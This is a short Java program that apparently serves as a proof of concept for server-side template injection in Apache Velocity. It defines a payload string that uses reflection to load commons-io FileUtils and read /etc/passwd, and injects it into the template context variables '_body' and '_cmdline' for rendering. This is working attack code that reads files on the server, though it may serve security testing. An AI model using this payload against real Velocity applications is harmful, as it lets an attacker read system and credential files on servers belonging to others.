package velocity;

import java.io.StringWriter;

import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;
import org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class VelocityApp {

	private static final Logger logger = LoggerFactory.getLogger(VelocityApp.class);

	private static final String PAYLOAD = "#set($fileUtils = $content.class.forName(\"org.apache.commons.io.FileUtils\"))\n"
			+ "$fileUtils.readFileToString($fileUtils.getFile(\"/etc/passwd\"))";

	public static void main(String[] args) {
		VelocityEngine velocityEngine = newVelocityEngine();
		velocityEngine.init();

		Template t = velocityEngine.getTemplate("index.vm");

		VelocityContext context = new VelocityContext();
		context.put("name", "World");
		context.put("_body", PAYLOAD);
		context.put("_cmdline", PAYLOAD);

		StringWriter writer = new StringWriter();
		t.merge( context, writer );
		String text = writer.toString();
		logger.info(text);
	}

	private static VelocityEngine newVelocityEngine() {
		VelocityEngine engine = new VelocityEngine();
		// engine.setProperty(VelocityEngine.RUNTIME_LOG_LOGSYSTEM_CLASS, SystemLogChute.class.getName());
		engine.setProperty(VelocityEngine.RESOURCE_LOADER, "classpath");
		engine.setProperty("classpath.resource.loader.class", ClasspathResourceLoader.class.getName());
		// engine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_CACHE, "true");
		// engine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, "velocity/");
		engine.init();
		return engine;
	}
}
